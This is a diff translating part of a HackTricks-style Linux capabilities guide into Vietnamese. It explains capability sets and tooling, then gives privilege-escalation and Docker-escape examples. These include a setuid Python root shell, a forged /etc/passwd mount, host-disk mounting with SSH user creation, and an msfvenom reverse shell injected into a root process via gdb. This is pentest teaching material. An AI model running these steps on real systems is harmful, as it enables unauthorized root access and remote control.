@@ -2,68 +2,68 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Linux capabilities divide **root privileges into smaller, distinct units**, allowing processes to have a subset of privileges. This minimizes the risks by not granting full root privileges unnecessarily.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>
+Linux capabilities chia **quyền root thành các đơn vị nhỏ, riêng biệt**, cho phép tiến trình chỉ có một tập con quyền. Điều này giảm thiểu rủi ro bằng cách không cấp toàn bộ quyền root khi không cần thiết.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>
 
-### The Problem:
+### Vấn đề:
 
-- Normal users have limited permissions for operations such as opening raw sockets or binding Internet ports below 1024; capabilities can grant only the required operation instead of full root privilege.<sup>[[14]](#references)</sup>
+- Người dùng thông thường có quyền hạn chế đối với các thao tác như mở raw socket hoặc bind các cổng Internet dưới 1024; capabilities có thể chỉ cấp quyền thực hiện thao tác cần thiết thay vì toàn bộ quyền root.<sup>[[14]](#references)</sup>
 
-### Capability Sets:
+### Các tập capability:
 
-Linux exposes these capability sets per thread, and the kernel applies their constraints when a process changes credentials or executes a file.<sup>[[14]](#references)</sup>
+Linux cung cấp các tập capability này cho mỗi thread, và kernel áp dụng các giới hạn của chúng khi một tiến trình thay đổi credentials hoặc thực thi một file.<sup>[[14]](#references)</sup>
 
 1. **Inherited (CapInh)**:
 
-   - **Purpose**: Identifies capabilities that may contribute to the permitted set after `execve()` when the executed file has matching inheritable file capabilities.
-   - **Functionality**: The thread's inheritable set is preserved across `execve()`; it does not make those capabilities effective by itself.
-   - **Restrictions**: Adding a capability to this set is constrained by the permitted and bounding sets.<sup>[[14]](#references)</sup>
+   - **Mục đích**: Xác định các capability có thể được đưa vào tập permitted sau `execve()` khi file được thực thi có các file capability inheritable tương ứng.
+   - **Chức năng**: Tập inheritable của thread được giữ nguyên qua `execve()`; bản thân nó không làm cho các capability đó trở thành effective.
+   - **Giới hạn**: Việc thêm một capability vào tập này bị giới hạn bởi các tập permitted và bounding.<sup>[[14]](#references)</sup>
 
 2. **Effective (CapEff)**:
 
-   - **Purpose**: Represents the actual capabilities a process is utilizing at any moment.
-   - **Functionality**: It's the set of capabilities checked by the kernel to grant permission for various operations. For files, this set can be a flag indicating if the file's permitted capabilities are to be considered effective.
-   - **Significance**: The effective set is crucial for immediate privilege checks, acting as the active set of capabilities a process can use.
+   - **Mục đích**: Đại diện cho các capability mà tiến trình đang sử dụng tại một thời điểm bất kỳ.
+   - **Chức năng**: Đây là tập capability mà kernel kiểm tra để cấp quyền thực hiện các thao tác khác nhau. Đối với file, tập này có thể là một cờ cho biết các capability permitted của file có được xem là effective hay không.
+   - **Ý nghĩa**: Tập effective rất quan trọng đối với việc kiểm tra quyền tức thời, đóng vai trò là tập capability đang hoạt động mà tiến trình có thể sử dụng.
 
 3. **Permitted (CapPrm)**:
 
-   - **Purpose**: Defines the maximum set of capabilities a process can possess.
-   - **Functionality**: A process can elevate a capability from the permitted set to its effective set, giving it the ability to use that capability. It can also drop capabilities from its permitted set.
-   - **Boundary**: If a capability is dropped from this set, it cannot normally be restored without executing a file that grants it or another privileged transition.<sup>[[14]](#references)</sup>
+   - **Mục đích**: Xác định tập capability tối đa mà một tiến trình có thể sở hữu.
+   - **Chức năng**: Tiến trình có thể nâng một capability từ tập permitted lên tập effective, qua đó có thể sử dụng capability đó. Tiến trình cũng có thể loại bỏ capability khỏi tập permitted.
+   - **Giới hạn**: Nếu một capability bị loại bỏ khỏi tập này, thông thường không thể khôi phục nó nếu không thực thi một file cấp capability đó hoặc trải qua một chuyển đổi đặc quyền khác.<sup>[[14]](#references)</sup>
 
 4. **Bounding (CapBnd)**:
 
-   - **Purpose**: Limits the capabilities a process can gain from a file during `execve()` and those it can add to its inheritable set.
-   - **Functionality**: The set is inherited across `fork()` and preserved across `execve()`; capabilities can be dropped from it when the caller has `CAP_SETPCAP`.
-   - **Use-case**: Removing unnecessary capabilities from this set limits later privilege acquisition.<sup>[[14]](#references)</sup>
+   - **Mục đích**: Giới hạn các capability mà tiến trình có thể nhận được từ một file trong quá trình `execve()` và các capability mà tiến trình có thể thêm vào tập inheritable.
+   - **Chức năng**: Tập này được kế thừa qua `fork()` và giữ nguyên qua `execve()`; có thể loại bỏ capability khỏi tập này nếu caller có `CAP_SETPCAP`.
+   - **Trường hợp sử dụng**: Loại bỏ các capability không cần thiết khỏi tập này sẽ hạn chế khả năng đạt được thêm đặc quyền về sau.<sup>[[14]](#references)</sup>
 
 5. **Ambient (CapAmb)**:
-   - **Purpose**: Allows selected capabilities to remain permitted and effective across `execve()` of a nonprivileged program.
-   - **Functionality**: Ambient capabilities are added to the new permitted and effective sets when the executed file is not privileged.
-   - **Restrictions**: A capability can be ambient only while it is present in both the permitted and inheritable sets; executing a set-user-ID/set-group-ID file or a file with capabilities clears the ambient set.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>
+   - **Mục đích**: Cho phép các capability được chọn tiếp tục ở trạng thái permitted và effective qua `execve()` của một chương trình không có đặc quyền.
+   - **Chức năng**: Các ambient capability được thêm vào các tập permitted và effective mới khi file được thực thi không có đặc quyền.
+   - **Giới hạn**: Một capability chỉ có thể là ambient khi nó hiện diện trong cả hai tập permitted và inheritable; việc thực thi file set-user-ID/set-group-ID hoặc file có capabilities sẽ xóa tập ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>
 
-## Processes & Binaries Capabilities
+## Capabilities của tiến trình & binary
 
-### Processes Capabilities
+### Capabilities của tiến trình
 
-To see the capabilities for a particular process, use the **status** file in the /proc directory. As it provides more details, let’s limit it only to the information related to Linux capabilities.\
-Note that for all running processes capability information is maintained per thread, while file capabilities are stored in `security.capability` extended attributes.<sup>[[14]](#references)[[15]](#references)</sup>
+Để xem capabilities của một tiến trình cụ thể, hãy dùng file **status** trong thư mục /proc. Vì file này cung cấp nhiều thông tin chi tiết hơn, hãy chỉ lọc những thông tin liên quan đến Linux capabilities.\
+Lưu ý rằng thông tin capability của mọi tiến trình đang chạy được duy trì theo từng thread, trong khi file capabilities được lưu trong các extended attribute `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>
 
-You can find the capabilities defined in /usr/include/linux/capability.h
+Bạn có thể tìm thấy danh sách capabilities được định nghĩa trong /usr/include/linux/capability.h
 
-You can find the capabilities of the current process in `cat /proc/self/status` or with `capsh --print`, and those of other processes in `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
+Bạn có thể xem capabilities của tiến trình hiện tại bằng `cat /proc/self/status` hoặc `capsh --print`, và xem capabilities của các tiến trình khác trong `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
 
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
 
-This command should return five capability lines on most systems.<sup>[[15]](#references)</sup>
+Lệnh này sẽ trả về năm dòng capability trên hầu hết các hệ thống.<sup>[[15]](#references)</sup>
 
-- CapInh = Inherited capabilities
-- CapPrm = Permitted capabilities
-- CapEff = Effective capabilities
-- CapBnd = Bounding set
-- CapAmb = Ambient capabilities set
+- CapInh = Các capability được kế thừa
+- CapPrm = Các capability được cho phép
+- CapEff = Các capability có hiệu lực
+- CapBnd = Tập giới hạn
+- CapAmb = Tập capability ambient
 
 ```bash
 #These are the typical capabilities of a root owned process (all)
@@ -74,14 +74,14 @@ CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
 
-These hexadecimal numbers don’t make sense. Using the `capsh` utility, we can decode them into capability names.<sup>[[26]](#references)</sup>
+Các số thập lục phân này không có ý nghĩa gì rõ ràng. Dùng tiện ích `capsh`, chúng ta có thể giải mã chúng thành tên capability.<sup>[[26]](#references)</sup>
 
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
 ```
 
-Lets check now the **capabilities** used by `ping`:
+Giờ hãy kiểm tra **capabilities** được `ping` sử dụng:
 
 ```bash
 cat /proc/9491/status | grep Cap
@@ -95,13 +95,13 @@ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
 
-Although that works, there is another and easier way. To see the capabilities of a running process, use the **getpcaps** tool followed by its process ID (PID); it also accepts a list of process IDs.<sup>[[22]](#references)</sup>
+Mặc dù cách đó hoạt động, vẫn còn một cách khác dễ hơn. Để xem capabilities của một tiến trình đang chạy, hãy dùng công cụ **getpcaps** theo sau là ID tiến trình (PID); công cụ này cũng chấp nhận danh sách ID tiến trình.<sup>[[22]](#references)</sup>
 
 ```bash
 getpcaps 1234
 ```
 
-Lets check the capabilities of `tcpdump` after giving the binary `cap_net_admin` and `cap_net_raw` to sniff the network (`tcpdump` is running in process 9562).<sup>[[22]](#references)[[25]](#references)</sup>
+Hãy kiểm tra các capabilities của `tcpdump` sau khi cấp cho binary này `cap_net_admin` và `cap_net_raw` để sniff mạng (`tcpdump` đang chạy trong process 9562).<sup>[[22]](#references)[[25]](#references)</sup>
 
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
@@ -121,49 +121,49 @@ $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
 
-As you can see, the capabilities correspond with the results of the two ways of inspecting a process. The `getpcaps` tool uses libcap to query a target process's capabilities and prints them in text form; it accepts one or more PIDs.<sup>[[22]](#references)</sup>
+Như bạn có thể thấy, các capability tương ứng với kết quả thu được từ hai cách kiểm tra một process. Công cụ `getpcaps` sử dụng libcap để truy vấn các capability của process đích và in chúng dưới dạng văn bản; công cụ này chấp nhận một hoặc nhiều PID.<sup>[[22]](#references)</sup>
 
-### Binaries Capabilities
+### Capability của binary
 
-Binaries can have file capabilities that are applied during execution. For example, a `ping` binary may carry the `cap_net_raw` capability.<sup>[[14]](#references)</sup>
+Binary có thể có file capability được áp dụng khi thực thi. Ví dụ, một binary `ping` có thể mang capability `cap_net_raw`.<sup>[[14]](#references)</sup>
 
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
 
-You can **search binaries with capabilities** using `getcap -r`.<sup>[[23]](#references)</sup>
+Bạn có thể **tìm kiếm các tệp nhị phân có capabilities** bằng `getcap -r`.<sup>[[23]](#references)</sup>
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-### Dropping capabilities with capsh
+### Loại bỏ capabilities bằng capsh
 
-If we drop `CAP_NET_RAW` from the prevailing bounding set, a program that needs that capability should no longer be able to use it.<sup>[[26]](#references)</sup>
+Nếu loại bỏ `CAP_NET_RAW` khỏi bounding set hiện hành, chương trình cần capability đó sẽ không còn sử dụng được nó.<sup>[[26]](#references)</sup>
 
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
 
-Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.
+Ngoài đầu ra của chính _capsh_, lệnh _tcpdump_ cũng sẽ báo lỗi.
 
 > /bin/bash: /usr/sbin/tcpdump: Operation not permitted
 
-The error shows that `tcpdump` cannot execute with the requested file capability after `CAP_NET_RAW` was removed from the bounding set.
+Lỗi này cho thấy `tcpdump` không thể thực thi với file capability được yêu cầu sau khi `CAP_NET_RAW` bị xóa khỏi bounding set.
 
-### Remove Capabilities
+### Xóa Capabilities
 
-You can remove a file's capabilities with `setcap -r`.<sup>[[25]](#references)</sup>
+Bạn có thể xóa capabilities của một file bằng `setcap -r`.<sup>[[25]](#references)</sup>
 
 ```bash
 setcap -r </path/to/binary>
 ```
 
-## User Capabilities
+## Capabilities của người dùng
 
-Linux does not assign file capabilities directly to a login user, but the `pam_cap` PAM module can set inheritable capabilities for authenticated sessions using `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Each entry maps comma-separated capability names or numbers to one or more usernames.<sup>[[17]](#references)</sup>
-File example:
+Linux không gán file capabilities trực tiếp cho người dùng đăng nhập, nhưng module PAM `pam_cap` có thể thiết lập inheritable capabilities cho các phiên đã xác thực thông qua `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Mỗi mục ánh xạ các tên hoặc số capability, phân tách bằng dấu phẩy, tới một hoặc nhiều tên người dùng.<sup>[[17]](#references)</sup>
+Ví dụ tệp:
 
 ```bash
 # Simple
@@ -179,9 +179,9 @@ cap_net_admin,cap_net_raw    jrnetadmin
 cap_sys_admin,22,25          jrsysadmin
 ```
 
-## Environment Capabilities
+## Capabilities của môi trường
 
-Compiling the following program makes it possible to **spawn a bash shell inside an environment that provides capabilities**.<sup>[[14]](#references)</sup>
+Biên dịch chương trình sau sẽ cho phép **khởi chạy shell bash bên trong một môi trường cung cấp capabilities**.<sup>[[14]](#references)</sup>
 
 ```c:ambient.c
 /*
@@ -279,7 +279,7 @@ sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
 
-Inside the **bash executed by the compiled ambient binary**, it is possible to observe the **new capabilities** (a regular user will not have any capability in the "current" section).<sup>[[14]](#references)</sup>
+Bên trong **bash được thực thi bởi binary ambient đã biên dịch**, có thể quan sát các **capability mới** (người dùng thông thường sẽ không có capability nào trong phần "current").<sup>[[14]](#references)</sup>
 
 ```bash
 capsh --print
@@ -287,15 +287,15 @@ Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 
 > [!CAUTION]
-> You can **only add capabilities that are present** in both the permitted and the inheritable sets.<sup>[[14]](#references)</sup>
+> Bạn **chỉ có thể thêm các capabilities có mặt** trong cả tập permitted lẫn tập inheritable.<sup>[[14]](#references)</sup>
 
-### Capability-aware/Capability-dumb binaries
+### Binary-aware/Binary-dumb về capabilities
 
-A capability-dumb binary is a program with file capabilities that does not use libcap to manage them. If its file effective bit is set, the kernel enables the file's permitted capabilities in the process's effective set; execution can fail if the process did not obtain all permitted capabilities.<sup>[[14]](#references)</sup>
+Binary capability-dumb là một chương trình có file capabilities nhưng không dùng libcap để quản lý chúng. Nếu bit effective của file được bật, kernel sẽ bật các capabilities trong tập permitted của file vào tập effective của process; quá trình thực thi có thể thất bại nếu process không nhận được tất cả các capabilities permitted.<sup>[[14]](#references)</sup>
 
-## Service Capabilities
+## Capabilities của service
 
-A system service that runs as root may retain broad capabilities unless its execution environment restricts them. In a systemd unit, `User=` selects the service user and `AmbientCapabilities=` adds named capabilities to the ambient set for the executed process.<sup>[[18]](#references)</sup>
+Một system service chạy với quyền root có thể giữ lại các capabilities rộng, trừ khi môi trường thực thi giới hạn chúng. Trong một systemd unit, `User=` chọn user của service và `AmbientCapabilities=` thêm các capabilities được chỉ định vào tập ambient của process được thực thi.<sup>[[18]](#references)</sup>
 
 ```bash
 [Service]
@@ -303,9 +303,9 @@ User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
 
-## Capabilities in Docker Containers
+## Capabilities trong Docker Containers
 
-Docker starts containers with a default capability set that can be changed with `--cap-add` and `--cap-drop`; an example container can be inspected with `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
+Docker khởi chạy các container với một tập capability mặc định có thể thay đổi bằng `--cap-add` và `--cap-drop`; có thể kiểm tra một container mẫu bằng `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
 
 ```bash
 docker run --rm -it  r.j3ss.co/amicontained bash
@@ -324,9 +324,9 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 
 ## Privesc/Container Escape
 
-Capabilities are useful when you **want to restrict your own processes after performing privileged operations** (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.<sup>[[2]](#references)</sup>
+Capabilities hữu ích khi bạn **muốn hạn chế các tiến trình của mình sau khi thực hiện các thao tác đặc quyền** (ví dụ: sau khi thiết lập chroot và bind vào một socket). Tuy nhiên, chúng có thể bị khai thác bằng cách truyền cho chúng các lệnh hoặc đối số độc hại, khiến các lệnh hoặc đối số đó được chạy với quyền root.<sup>[[2]](#references)</sup>
 
-You can force file capabilities onto programs with `setcap`, and query them with `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
+Bạn có thể ép các file capabilities lên chương trình bằng `setcap` và truy vấn chúng bằng `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
 
 ```bash
 #Set Capability
@@ -337,17 +337,17 @@ getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
 
-For file-capability text, `+ep` raises the named capability in the effective and permitted sets; `-` lowers the selected flags.<sup>[[21]](#references)</sup>
+Đối với văn bản file-capability, `+ep` thêm capability được chỉ định vào các tập effective và permitted; `-` hạ các cờ đã chọn.<sup>[[21]](#references)</sup>
 
-To identify programs in a system or folder with capabilities, use `getcap -r`.<sup>[[23]](#references)</sup>
+Để xác định các chương trình có capabilities trong hệ thống hoặc thư mục, hãy dùng `getcap -r`.<sup>[[23]](#references)</sup>
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-### Exploitation example
+### Ví dụ khai thác
 
-In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:
+Trong ví dụ sau, binary `/usr/bin/python2.6` được phát hiện có lỗ hổng privesc:
 
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
@@ -357,7 +357,7 @@ setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
 
-**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:
+**Capabilities** cần thiết cho `tcpdump` để **cho phép bất kỳ người dùng nào sniff packets**:
 
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -365,24 +365,24 @@ getcap /usr/sbin/tcpdump
 /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
 
-### The special case of an omitted capability name
+### Trường hợp đặc biệt khi tên capability bị bỏ trống
 
-In libcap's text format, `getcap myelf` reporting `myelf =ep` means **all capabilities** are marked effective and permitted, subject to the executing process's bounding set, user namespace, and other execution restrictions. The empty file capability set is `myelf =` (with no `e` or `p`); it is distinct from a file with no capability attribute. An `=ep` file does not by itself change the process UID to root, but a program able to use `CAP_DAC_READ_SEARCH` or `CAP_DAC_OVERRIDE` may read files its Unix UID otherwise could not. Confirm the actual executable's file mode, namespace, and effective capabilities before treating its input options as a privileged file-read path. See libcap's [capability text format](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) and [empty-value behavior](https://man7.org/linux/man-pages/man8/getcap.8.html).<sup>[[14]](#references)</sup>
+Trong định dạng văn bản của libcap, `getcap myelf` báo `myelf =ep` có nghĩa là **tất cả capability** được đánh dấu là effective và permitted, tùy thuộc vào bounding set, user namespace và các hạn chế thực thi khác của tiến trình đang chạy. Tập file capability rỗng được biểu thị là `myelf =` (không có `e` hoặc `p`); trường hợp này khác với file không có thuộc tính capability. File `=ep` tự nó không thay đổi UID của tiến trình thành root, nhưng chương trình có thể sử dụng `CAP_DAC_READ_SEARCH` hoặc `CAP_DAC_OVERRIDE` có thể đọc các file mà UID Unix của nó vốn không có quyền đọc. Hãy xác nhận file mode, namespace và effective capabilities của executable thực tế trước khi xem các tùy chọn đầu vào của nó là đường dẫn đọc file có đặc quyền. Xem [định dạng văn bản capability](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) và [hành vi của giá trị rỗng](https://man7.org/linux/man-pages/man8/getcap.8.html) trong libcap.<sup>[[14]](#references)</sup>
 
 ## CAP_SYS_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is a highly potent Linux capability, often equated to a near-root level due to its extensive **administrative privileges**, such as mounting devices or manipulating kernel features. While indispensable for containers simulating entire systems, **`CAP_SYS_ADMIN` poses significant security challenges**, especially in containerized environments, due to its potential for privilege escalation and system compromise. Therefore, its usage warrants stringent security assessments and cautious management, with a strong preference for dropping this capability in application-specific containers to adhere to the **principle of least privilege** and minimize the attack surface.<sup>[[14]](#references)</sup>
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** là một Linux capability có quyền hạn rất lớn, thường được xem là gần tương đương mức root do có các **quyền quản trị** rộng, chẳng hạn như mount thiết bị hoặc thao tác với các tính năng của kernel. Dù không thể thiếu đối với các container mô phỏng toàn bộ hệ thống, **`CAP_SYS_ADMIN` đặt ra những thách thức đáng kể về bảo mật**, đặc biệt trong môi trường container, do khả năng leo thang đặc quyền và xâm phạm hệ thống. Vì vậy, việc sử dụng capability này cần được đánh giá bảo mật nghiêm ngặt và quản lý thận trọng; nên ưu tiên loại bỏ capability này khỏi các container dành riêng cho ứng dụng để tuân thủ **nguyên tắc đặc quyền tối thiểu** và giảm thiểu bề mặt tấn công.<sup>[[14]](#references)</sup>
 
-For namespace pivots, scope matters: `setns()` checks `CAP_SYS_ADMIN` against the user namespace that owns the target. Entering a mount namespace also requires `CAP_SYS_CHROOT` in the caller's user namespace. A capability held only inside a private remapped user namespace therefore does not grant arbitrary entry into initial host namespaces.<sup>[[14]](#references)</sup>
+Với các thao tác chuyển namespace, phạm vi rất quan trọng: `setns()` kiểm tra `CAP_SYS_ADMIN` dựa trên user namespace sở hữu namespace đích. Việc vào một mount namespace cũng yêu cầu caller có `CAP_SYS_CHROOT` trong user namespace của mình. Do đó, capability chỉ có trong một user namespace remap riêng không cấp quyền vào tùy ý các namespace của host ban đầu.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
 
-Using python you can mount a modified _passwd_ file on top of the real _passwd_ file:
+Dùng Python, bạn có thể mount một tệp _passwd_ đã chỉnh sửa đè lên tệp _passwd_ thực:
 
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
@@ -390,7 +390,7 @@ openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
 
-And finally **mount** the modified `passwd` file on `/etc/passwd`:
+Và cuối cùng, **mount** tệp `passwd` đã chỉnh sửa lên `/etc/passwd`:
 
 ```python
 from ctypes import *
@@ -405,11 +405,11 @@ mountflags = MS_BIND
 libc.mount(source, target, filesystemtype, mountflags, options)
 ```
 
-And you will be able to **`su` as root** using password "password".
+Và bạn sẽ có thể **`su` thành root** bằng mật khẩu "password".
 
-**Example with environment (Docker breakout)**
+**Ví dụ với môi trường (Docker breakout)**
 
-You can check the enabled capabilities inside the docker container using:
+Bạn có thể kiểm tra các capabilities được bật bên trong docker container bằng cách dùng:
 
 ```
 capsh --print
@@ -424,11 +424,11 @@ gid=0(root)
 groups=0(root)
 ```
 
-Inside the previous output you can see that the SYS_ADMIN capability is enabled.<sup>[[14]](#references)</sup>
+Trong kết quả trước đó, bạn có thể thấy capability SYS_ADMIN được bật.<sup>[[14]](#references)</sup>
 
 - **Mount**
 
-With suitable device and namespace access, this can allow a Docker container to **mount a host disk and access its contents**. The device node must represent a real host device, the device cgroup must allow it, and mounting a block-based filesystem requires `CAP_SYS_ADMIN` in the initial user namespace.<sup>[[14]](#references)</sup>
+Với quyền truy cập phù hợp vào device và namespace, việc này có thể cho phép một Docker container **mount ổ đĩa của host và truy cập nội dung bên trong**. Device node phải đại diện cho một thiết bị thực của host, device cgroup phải cho phép truy cập thiết bị đó, và để mount filesystem dựa trên block, cần có `CAP_SYS_ADMIN` trong initial user namespace.<sup>[[14]](#references)</sup>
 
 ```bash
 lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
@@ -439,10 +439,10 @@ cat /mnt/host/etc/hostname
 umount /mnt/host
 ```
 
-- **Full access**
+- **Toàn quyền truy cập**
 
-In the previous method we managed to access a host disk.\
-If the host is running an **ssh** server, you could **create a user inside the mounted disk** and access it via SSH.<sup>[[14]](#references)</sup>
+Trong phương pháp trước, chúng ta đã truy cập được vào ổ đĩa của host.\
+Nếu host đang chạy server **ssh**, bạn có thể **tạo một user bên trong ổ đĩa đã mount** rồi truy cập qua SSH.<sup>[[14]](#references)</sup>
 
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
@@ -458,15 +458,15 @@ chroot /mnt/host adduser john
 ssh john@172.17.0.1 -p 2222
 ```
 
-Direct reads and writes under `/mnt/host` are already host-filesystem access. The final `chroot` is only a pathname convenience and additionally requires `CAP_SYS_CHROOT`; it is not the step that creates the escape.
+Các thao tác đọc và ghi trực tiếp bên dưới `/mnt/host` đã là quyền truy cập hệ thống tệp của host. `chroot` cuối cùng chỉ giúp thuận tiện khi dùng đường dẫn và còn yêu cầu `CAP_SYS_CHROOT`; đây không phải là bước tạo ra khả năng thoát.
 
 ## CAP_SYS_PTRACE
 
-With `CAP_SYS_PTRACE`, a process can trace and inspect other processes that are visible in its PID namespace. To target host processes from a Docker container, share the host PID namespace with `--pid=host` (or join a namespace containing the target).<sup>[[14]](#references)[[20]](#references)</sup>
+Với `CAP_SYS_PTRACE`, một tiến trình có thể trace và kiểm tra các tiến trình khác mà nó nhìn thấy trong PID namespace của mình. Để nhắm tới các tiến trình trên host từ một Docker container, hãy chia sẻ PID namespace của host bằng `--pid=host` (hoặc tham gia một namespace có chứa tiến trình mục tiêu).<sup>[[14]](#references)[[20]](#references)</sup>
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** grants the ability to use debugging and system call tracing functionalities provided by `ptrace(2)` and cross-memory attach calls like `process_vm_readv(2)` and `process_vm_writev(2)`. Although powerful for diagnostic and monitoring purposes, if `CAP_SYS_PTRACE` is enabled without restrictive measures like a seccomp filter on `ptrace(2)`, it can significantly undermine system security. Specifically, it can be exploited to circumvent other security restrictions, notably those imposed by seccomp, as demonstrated by [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** cấp quyền sử dụng các chức năng debugging và system call tracing do `ptrace(2)` cung cấp, cũng như các lệnh gọi gắn kết bộ nhớ chéo như `process_vm_readv(2)` và `process_vm_writev(2)`. Dù hữu ích cho mục đích chẩn đoán và giám sát, nếu bật `CAP_SYS_PTRACE` mà không có các biện pháp hạn chế như seccomp filter đối với `ptrace(2)`, nó có thể làm suy yếu đáng kể tính bảo mật của hệ thống. Cụ thể, quyền này có thể bị khai thác để vượt qua các hạn chế bảo mật khác, đáng chú ý là các hạn chế do seccomp áp đặt, như được minh họa trong [các proof of concept (PoC) như ví dụ này](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>
 
-**Example with binary (python)**
+**Ví dụ với binary (python)**
 
 ```bash
 getcap -r / 2>/dev/null
@@ -560,17 +560,17 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 
-**Example with binary (gdb)**
+**Ví dụ với binary (gdb)**
 
-`gdb` with `ptrace` capability:
+`gdb` có capability `ptrace`:
 
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
 
-A capability on a debugger is a review lead only. Check whether the current process can execute that exact file (including group and ACL permissions), whether `CAP_SYS_PTRACE` is effective after execution, and whether a higher-privileged target is visible and attachable in the same PID namespace. `no_new_privs`, a `nosuid` mount, the capability bounding set, Yama, seccomp, or an LSM can change the result. See [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) and the [kernel's Yama documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html). Enumerate file and process metadata without attaching to a target.
+Một capability trên debugger chỉ là đầu mối để rà soát. Kiểm tra xem tiến trình hiện tại có thể thực thi chính xác tệp đó hay không (bao gồm quyền của group và ACL), liệu `CAP_SYS_PTRACE` có hiệu lực sau khi thực thi hay không, và liệu tiến trình đích có đặc quyền cao hơn có hiển thị và có thể được attach trong cùng PID namespace hay không. `no_new_privs`, một mount `nosuid`, capability bounding set, Yama, seccomp hoặc một LSM có thể làm thay đổi kết quả. Xem [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) và [tài liệu Yama của kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html). Liệt kê metadata của tệp và tiến trình mà không attach vào tiến trình đích.
 
-Create a shellcode with msfvenom to inject in memory via gdb
+Tạo shellcode bằng msfvenom để inject vào bộ nhớ thông qua gdb.
 
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
@@ -596,7 +596,7 @@ for i in range(0, len(buf), 8):
 	print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
 
-Debug a root process with gdb ad copy-paste the previously generated gdb lines:
+Debug tiến trình root bằng gdb và sao chép-dán các dòng gdb đã tạo trước đó:
 
 ```bash
 # Let's write the commands to a file
@@ -621,9 +621,9 @@ process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
 
-**Example with environment (Docker breakout) - Another gdb Abuse**
+**Ví dụ với environment (Docker breakout) - Một cách Abuse GDB khác**
 
